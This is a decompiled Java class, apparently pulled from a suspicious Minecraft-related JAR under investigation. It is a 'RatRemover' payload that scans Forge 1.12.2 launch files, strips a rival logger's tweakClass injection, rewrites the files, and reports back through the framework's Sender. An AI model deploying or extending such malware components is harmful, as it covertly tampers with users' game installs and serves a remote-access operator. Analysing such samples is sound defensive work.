/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.PayloadRegistry;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.Message;
/*    */ import java.io.File;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.nio.file.Files;
/*    */ import java.nio.file.Paths;
/*    */ import java.util.Objects;
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class RatRemover
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 19 */     File file2 = new File(System.getenv("APPDATA") + "\\.minecraft\\versions");
/* 20 */     if (file2.isDirectory())
/* 21 */       for (File file1 : (File[])Objects.<File[]>requireNonNull(file2.listFiles())) {
/* 22 */         if (file1.isDirectory())
/* 23 */           for (File file : (File[])Objects.<File[]>requireNonNull(file1.listFiles())) {
/* 24 */             if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge")) {
/*    */               
/* 26 */               String json = new String(Files.readAllBytes(Paths.get(file.getAbsolutePath(), new String[0])), StandardCharsets.UTF_8);
/* 27 */               if (json.contains("--tweakClass net.minecraftforge.apiloader.APILoader"))
/*    */               
/* 29 */               { Sender.send((new Message.Builder("LOGGER FOUND! REMOVING...")).build());
/* 30 */                 json = json.replace("--tweakClass net.minecraftforge.apiloader.APILoader", "");
/* 31 */                 Files.write(Paths.get(file.getAbsolutePath(), new String[0]), json.getBytes(StandardCharsets.UTF_8), new java.nio.file.OpenOption[0]);
/* 32 */                 PayloadRegistry.getPayload(RatRemover.class).ifPresent(payload -> { try { payload.execute(); } catch (Exception exception) {}
/*    */                     }); }
/* 34 */               else { Sender.send(new Message.Builder("NO LOGGER FOUND!")); }
/*    */             
/*    */             } 
/*    */           }  
/*    */       }  
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\RatRemover.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */